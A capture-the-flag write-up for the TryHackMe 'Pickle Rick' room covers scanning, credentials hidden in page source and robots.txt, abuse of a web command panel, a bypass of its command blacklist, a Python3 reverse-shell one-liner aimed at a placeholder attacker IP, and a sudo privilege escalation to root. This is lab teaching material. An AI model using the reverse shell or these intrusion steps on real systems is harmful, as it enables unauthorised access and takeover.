# [THM-PickleRick](https://tryhackme.com/room/picklerick) - Maxwell Caron

A Rick and Morty CTF. Help turn Rick back into a human!


# External

Inital `nmap` scan:
```
$ nmap -sC -sV -oN inital 10.10.69.168

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d0:e3:a6:9f:40:19:68:a8:db:34:29:e9:45:bd:40:91 (RSA)
|   256 77:25:a2:d4:0b:05:17:05:20:3b:a6:74:ef:cf:1a:9f (ECDSA)
|_  256 5c:2a:7b:9b:0d:b3:73:37:6b:7f:32:dc:be:5a:f8:ea (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`gobuster` scan:
```
$ gobuster dir -u http://10.10.69.168 -w /opt/directory-brute.txt -x php,txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.69.168
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/directory-brute.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/05/28 13:50:42 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.69.168/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                   
/robots.txt           (Status: 200) [Size: 17]
```

From our inital scans the obvious first move is to enumerate the web page running on port `80` since we have nothing to go off of for `ssh` 

# Web App

![mainpage](https://i.imgur.com/Xie6ulW.png)

Looking at the main page, nothing realling stands out to us except some room *lore* but, checking out the source of the page by pressing `CTRL + u` we get something interesting.

1.png


In a pretty bold comment we see `rick` has taken a note of his username but no password in sight. Now we know we have a username *most likely* for that `/login.php` page...

![loginpage](https://i.imgur.com/3GaYesG.png)

I tried some quick SQLi payloads to see if we have an easy access but came up with nothing. At first I thought of using `hydra` to brute-force his password but than I looked back at the gobuster scan and saw that we found `robots.txt` this file isn't always useful but you should always check it.

![robots](https://i.imgur.com/iZhpgcx.png)

Inside, we see a *phrase* concatinated into a single word since it was in `robots.txt` I thought this might be a hidden directory, tring to access that page we get a `404` meaning it does not exist. 

After a few minutes of thinking, if `rick` hid his password inside of the web page, he might be hiding his password as well, going off of this thought, I tried using the word that we found in `robots.txt` as `rick`'s password...

![loggedin](https://i.imgur.com/oTIpnvz.png)

It worked! we are greeted with a "Command Panel" hovering out mouse over each of the words in the header of the page, they all redirect us to `/denied.php` stating that *"Only the **REAL** rick can view this page.."*

Trying not to get distracted with that *juicy* command panel I decided to look at the source of the page to see if there was anything else hidden.

![fake](https://i.imgur.com/3oFkuHb.png)

Once again the pattern continues and we see what looks like a base64 hash commented out inside of the page source

Buuuuut, after some attempted decoding, this was nothing but a rabbit hole...

Moving on, from experience I've seen a few of these *"Command Panel"*s before so I decided to input a simple linux command into the panel.

![exec](https://i.imgur.com/g5Cnjaf.png)

Upon clicking execute, we see that the command that we inputted in executed and displayed to us.

There is a log that we can do with this including potentially getting a reverse shell but, I decided not to just straight to a reverse shell and rather do most of my enumeration in this command panel.

![ls](https://i.imgur.com/Lg6A9PA.png)

Running `ls -al` gives us the output above. Looking at this output we see some familiar files such as `index.html`, `robots.txt`, `portal.php`, etc. I realized that we are in the `/var/www/html` directory which is the directory that this `apache2` web server runs off of.

There are a few files that catch my eye here, since we can execute commands we can simple just `cat` these files out... right?

![wrong](https://i.imgur.com/FD6xenJ.png)

wrong. It seems that the `cat` command is disabled, that's fine there are plenty of other ways to read the contents of these files. 

Let's see how they are blocking us from using a certain command.

3.png

Using the `tac` command we can read the source code of the file and see a `javascript` method with an array inside with the blacklisted commands. 

Starting out with the `Sup3rS3cretPickl3Ingred.txt` file, since we are in the web page's file tree, I simply just attached it to the url in the address bar but, you could use `tac` instead of `cat` to do the same thing

![firstflag](https://i.imgur.com/KgERNPh.png)

Inside of this is our first flag!

Next, let's take a look at the `clue.txt` file.

![clue](https://i.imgur.com/M8OZuyz.png)

Reading this file we see that it is hinting at us to look around the file system for the next flag.

Instead of manually looking around, we can use the `find` command inside of the command panel to speed up the process.

2.png

using this command, `find / -name "*second*" 2>>/dev/null` we see a quite promising file by the name `second ingredients` in `rick`'s home directory, let's see if we can `tac` it out.

!(secondflag)[https://i.imgur.com/yqbY0u6.png]

We can! After looking around a bit more to see if we could somehow access the final flag I decided it was time to get a shell.

Heading over to pentestmonkey's [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Knowing that we cannot use `cat` in our input, we are unable to use the netcat reverse shell, so let's see if we can use `python3` in the command panel. 

![python](https://i.imgur.com/VojqzxJ.png)

Using the `which` command we see that `python3` is installed and from the array of blacklisted commands that we found earlier, we know that we are able to use it as well.

![nclistener](https://i.imgur.com/xb2e9GB.png)

After setting up our `netcat` listener, we can paste the reverse shell into the command panel.
*make sure you are using `python3` not `python`*

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![werein](https://i.imgur.com/ih6Abse.png)

# Internal

Now that we have a shell on the box, I will stablize it by using a few commands..

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

These commands stablize our shell so we can use our arrow keys, the `clear` command, etc.

We see that we are running as a low-privileged user `www-data`, I will start off with some manual enumeration to see if we can escalate our privileges.

I alwasys start off my manual emueration with `sudo -l` this command lists commands that we can use as `sudo`, or the `root` user.

![sudol](https://i.imgur.com/gktO0Eu.png)

Looks like we can user any command as any user without supplying a password!

![privesc](https://i.imgur.com/C7Lgj5D.png)

Just like that we are root, all we have to do is find the final flag.

![finalflag](https://i.imgur.com/VtzZbTT.png)

Checking out the `/root` directory we see `3rd.txt` with the third and final flag inside. That is all of the flags, thank you for joining me :)


